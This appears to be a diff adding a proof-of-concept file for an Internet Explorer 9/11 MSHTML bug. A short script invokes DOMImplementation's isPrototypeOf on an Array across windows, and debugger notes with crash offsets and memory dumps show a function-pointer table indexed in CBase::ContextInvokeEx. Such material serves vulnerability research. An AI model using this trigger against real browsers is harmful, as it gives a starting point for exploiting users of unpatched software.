@@ -1,0 +1,55 @@
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script>
+  alert(1);
+  open("target.html");
+  f = DOMImplementation('').prototype.isPrototypeOf;
+  f(new Array);
+  function fTargetLoadedCallback(oWindow) {
+    alert(2);
+    f = oWindow.DOMImplementation('').prototype.isPrototypeOf;
+    f(new Array);
+  };
+</script>
+# MSIE9: MSHTML!CBase::ContextInvokeEx+0x4d77
+
+# MSIE 11: MSHTML!CBase::ContextInvokeEx+0x2ec
+
+# Read function pointer from table:
+# MSHTML!CBase::ContextInvokeEx+0x21b
+# table: MSHTML+0x2f74d8+(@eax*4)
+
+# 1 index = 13
+6a525490 00000000 
+6a525494 6a228fd8 MSHTML!`string'
+6a525498 00000000 
+6a52549c 00000000 
+6a5254a0 00000000 
+6a5254a4 00000300 
+6a5254a8 00000000 
+6a5254ac 00000004 
+6a5254b0 00000000 
+6a5254b4 00000013 <<<
+6a5254b8 0000ffff 
+6a5254bc 00000000 
+6a5254c0 00000000 
+
+MSHTML!GS_VARIANT
+
+# 2 index = 2f
+
+
+6a73f808 00000000 
+6a73f80c 00000000 
+6a73f810 6a3a719c MSHTML!`string'
+6a73f814 00000000 
+6a73f818 00000000 
+6a73f81c 00000000 
+6a73f820 00000000 
+6a73f824 000003e8 
+6a73f828 00000000 
+6a73f82c 0000002f <<<
+6a73f830 0000ffff 
+6a73f834 6a24daf4 MSHTML!s_methdescCDOMImplementationcreateDocument+0x34
+6a73f838 00010002 
+
+MSHTML!Method_VARIANTBOOLp_BSTR_o0oVARIANT
